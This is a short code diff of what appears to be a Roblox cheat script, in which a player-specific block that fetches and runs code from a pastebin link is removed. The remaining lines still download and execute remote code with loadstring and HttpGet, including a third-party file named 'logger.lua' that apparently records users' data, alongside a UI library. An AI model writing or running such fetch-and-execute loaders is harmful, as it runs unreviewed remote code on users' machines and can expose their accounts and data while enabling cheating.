@@ -1,9 +1,6 @@
 print("Init")
 local player = game:GetService"Players".LocalPlayer
-if player.name == "LaRussieCool6" then
-	loadstring(game:HttpGet("https://pastebin.com/raw/Kbfv46CU"))()
-	wait(11111111111111)
-end
+
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Diapolo69/ps99/main/logger.lua'))()
 wait(1)
 local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
